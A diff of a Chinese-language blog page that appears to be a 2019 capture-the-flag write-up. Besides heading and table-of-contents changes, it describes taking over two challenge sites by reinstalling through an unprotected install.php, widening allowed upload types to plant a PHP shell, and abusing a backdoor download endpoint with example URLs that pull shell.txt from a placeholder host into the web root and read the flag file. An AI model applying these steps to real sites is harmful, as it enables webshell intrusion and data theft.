@@ -74,7 +74,7 @@
 
 </header>
 
-<div class="m-header ">
+<div class="m-header" id="headers" >
 	<section id="hero1" class="hero">
 		<div class="inner">
 		</div>
@@ -83,6 +83,7 @@
 		<figure class="top-image" data-enable=true></figure>
 	
 </div>
+
 
 <!--文章列表-->
 <div class="wrapper">
@@ -97,7 +98,7 @@
   
 
 	<div class='post-body mb'>
-		<h1 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h1><ul>
+		<h2 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h2><ul>
 <li>首先直奔<code>install.php</code>发现源码中并没有做出重装限制，并且在<code>config.php</code>可以知道数据库和账号密码直接重装系统拿下后台。</li>
 <li>拿下后台发现系统设置处可以修改上传文件类型。</li>
 </ul>
@@ -118,7 +119,7 @@
 <li>直接上传php文件直接getshell</li>
 </ul>
 <p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745181028456.png" alt="img"></p>
-<h1 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h1><p>/index.php/home/test存在一处后门直接可getflag</p>
+<h2 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h2><p>/index.php/home/test存在一处后门直接可getflag</p>
 <pre><code>// /Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php
 ///Home/Test/dlfile?file_url=file:///flag&amp;save_to=/var/www/html/1.txt
     // 下载图片
@@ -142,6 +143,63 @@ public function dlfile($file_url, $save_to)
 		<time class="post-date" datetime="2019-11-22T14:28:47.000Z" itemprop="datePublished">2019-11-22</time>
 	</div>
 </article>
+<!-- 目录内容 -->
+<div >
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+    <div id="toc-article" class="toc-article">
+        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+        <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#粤湾期货"><span class="toc-number">1.</span> <span class="toc-text">粤湾期货</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#粤湾基金"><span class="toc-number">2.</span> <span class="toc-text">粤湾基金</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+    function showToc(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribrootute("style","display:block");
+        show_toc_btn.setAttribute("style","display:none");
+        };
+    function showBtn(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribute("style","display:none");
+        show_toc_btn.setAttribute("style","display:block");
+        };
+	function getScrollTop() {
+	    var scroll_top = 0;
+	    if (document.documentElement && document.documentElement.scrollTop) {
+		scroll_top = document.documentElement.scrollTop;
+	    }
+	    else if (document.body) {
+		scroll_top = document.body.scrollTop;
+	    }
+	    return scroll_top;
+	};
+	var headers=document.getElementById("headers");
+	var tocs = document.getElementById("toc-article");
+	
+	
+	window.onscroll  = function(){
+	if(getScrollTop()>450){
+			if(tocs.offsetTop>100){
+			var tophight = tocs.offsetTop-15;
+			tocs.style.cssText="top:"+tophight+"px";
+			}
+	}else{
+			tocs.style.cssText="top:540px";
+		}
+				
+		
+		console.log(getScrollTop());	
+		
+	}
+   </script>
+      
+<!-- 目录内容结束 -->
+</div>
 
 <!--评论-->
 
